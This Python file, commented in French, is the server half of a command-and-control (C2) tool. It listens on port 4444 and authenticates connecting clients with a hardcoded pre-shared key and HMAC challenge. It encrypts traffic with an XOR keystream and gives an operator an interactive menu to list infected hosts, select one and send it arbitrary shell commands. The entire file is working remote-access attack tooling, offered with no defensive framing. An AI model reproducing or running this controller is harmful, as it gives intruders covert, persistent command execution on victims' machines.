#!/usr/bin/env python3
import socket
import threading
import json
import struct
import hashlib
import hmac
import secrets
import time
import sys
import subprocess
import shutil
import os

# --- CONFIGURATION (doit être identique au client) ---
HOST = "0.0.0.0"
PORT = 4444
SECRET = "PSK-2027-C2"
KEY = hashlib.sha256(b"c2_encryption_key_2027").digest()
HEADER_FORMAT = ">I"
HEADER_SIZE = struct.calcsize(HEADER_FORMAT)

# Stockage des clients connectés
clients = {}
client_id_counter = 1
lock = threading.Lock()

# --- FONCTIONS DE CHIFFREMENT (identiques au client) ---
def _keystream(length):
    out = b""
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(KEY + counter.to_bytes(8, "big")).digest()
        counter += 1
    return out[:length]

def _crypt(data):
    return bytes(a ^ b for a, b in zip(data, _keystream(len(data))))

def send_message(sock, message):
    data = json.dumps(message).encode("utf-8")
    enc = _crypt(data)
    sock.sendall(struct.pack(HEADER_FORMAT, len(enc)) + enc)

def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connexion fermée")
        data += chunk
    return data

def recv_message(sock):
    header = _recv_exact(sock, HEADER_SIZE)
    length = struct.unpack(HEADER_FORMAT, header)[0]
    body = _recv_exact(sock, length)
    return json.loads(_crypt(body).decode("utf-8"))

def _hmac(secret, nonce):
    return hmac.new(secret.encode(), nonce.encode(), hashlib.sha256).hexdigest()

# --- GESTION D'UN CLIENT ---
def handle_client(conn, addr):
    global client_id_counter
    cid = None
    try:
        # 1. Authentification
        info_msg = recv_message(conn)
        nonce = secrets.token_hex(16)
        send_message(conn, {"type": "challenge", "payload": nonce})
        
        auth_msg = recv_message(conn)
        if auth_msg.get("payload") != _hmac(SECRET, nonce):
            print(f"[-] Echec authentification de {addr}")
            conn.close()
            return

        # 2. Enregistrement
        with lock:
            cid = client_id_counter
            client_id_counter += 1
            hostname = info_msg.get("payload", {}).get("hostname", "Inconnu")
            clients[cid] = {"conn": conn, "hostname": hostname, "addr": addr}
        
        print(f"\n[+] Nouveau client connecté ! ID: {cid} | Hostname: {hostname} | IP: {addr[0]}")

        # 3. Boucle d'attente
        while True:
            msg = recv_message(conn)
            if msg.get("type") == "result":
                print(f"\n[{hostname}] Sortie:\n{msg.get('payload')}")
            elif msg.get("type") == "error":
                print(f"\n[{hostname}] Erreur:\n{msg.get('payload')}")
            print("C2 > ", end="", flush=True) # Réaffiche le prompt

    except Exception:
        pass
    finally:
        with lock:
            if cid in clients:
                del clients[cid]
                print(f"\n[-] Client {cid} ({addr[0]}) déconnecté.")
                print("C2 > ", end="", flush=True)
        conn.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Serveur C2 en écoute sur {HOST}:{PORT}...")
    
    while True:
        conn, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.daemon = True
        t.start()

# --- INTERFACE INTERACTIVE ---
def main_menu():
    current_target = None
    
    while True:
        if current_target is None:
            prompt = "C2 > "
        else:
            with lock:
                if current_target not in clients:
                    print(f"\n[-] Client {current_target} perdu.")
                    current_target = None
                    continue
                hostname = clients[current_target]["hostname"]
            prompt = f"shell ({hostname}) > "

        try:
            cmd = input(prompt).strip()
        except KeyboardInterrupt:
            print("\nAu revoir.")
            sys.exit(0)

        if not cmd:
            continue

        if current_target is None:
            # Menu principal
            if cmd == "list":
                with lock:
                    if not clients:
                        print("Aucun client connecté.")
                    else:
                        print("\nID | Hostname | IP")
                        print("-" * 40)
                        for k, v in clients.items():
                            print(f"{k:<2} | {v['hostname']:<10} | {v['addr'][0]}")
                        print()
            elif cmd.startswith("use "):
                try:
                    cid = int(cmd.split()[1])
                    with lock:
                        if cid in clients:
                            current_target = cid
                            print(f"[*] Ciblage du client {cid}")
                        else:
                            print(f"[-] Client {cid} introuvable.")
                except (IndexError, ValueError):
                    print("Usage: use <ID>")
            elif cmd == "exit":
                sys.exit(0)
            else:
                print("Commandes disponibles: list, use <ID>, exit")
        else:
            # Mode shell (dans un client)
            if cmd == "back":
                current_target = None
            else:
                with lock:
                    conn = clients[current_target]["conn"]
                try:
                    send_message(conn, {"type": "command", "payload": cmd})
                    time.sleep(0.1) 
                except Exception as e:
                    print(f"[-] Erreur d'envoi: {e}")
                    current_target = None

# --- LANCEMENT ET GESTION DES FENÊTRES ---
def launch_terminal():
    script_path = os.path.abspath(__file__)
    
    if sys.platform.startswith("win"):
        # Pour Windows
        subprocess.Popen(f'start cmd /k python "{script_path}"', shell=True)
        sys.exit(0)
    elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
        # Pour Linux (Kali) et macOS
        # On cherche un émulateur de terminal disponible
        terminals = ["gnome-terminal", "x-terminal-emulator", "konsole", "xfce4-terminal", "xterm"]
        for term in terminals:
            if shutil.which(term):
                if term == "gnome-terminal":
                    cmd = [term, "--", "python3", script_path]
                elif term == "xfce4-terminal":
                    cmd = [term, "-e", f"python3 '{script_path}'"]
                else:
                    cmd = [term, "-e", f"python3 '{script_path}'"]
                
                subprocess.Popen(cmd)
                sys.exit(0)
        
        print("[-] Aucun émulateur de terminal graphique trouvé. Lancement dans le terminal actuel.")
        return False
    return False

if __name__ == "__main__":
    # On vérifie si on tourne déjà dans un terminal lancé par le script (pour éviter une boucle infinie)
    # On utilise une variable d'environnement pour le savoir.
    if not os.environ.get("C2_IN_NEW_TERM"):
        os.environ["C2_IN_NEW_TERM"] = "1"
        if launch_terminal():
            # Si un nouveau terminal a été lancé, on quitte l'ancien processus
            sys.exit(0)

    # Si on arrive ici, c'est qu'on est dans le bon terminal
    t = threading.Thread(target=start_server, daemon=True)
    t.start()
    time.sleep(0.5)
    main_menu()
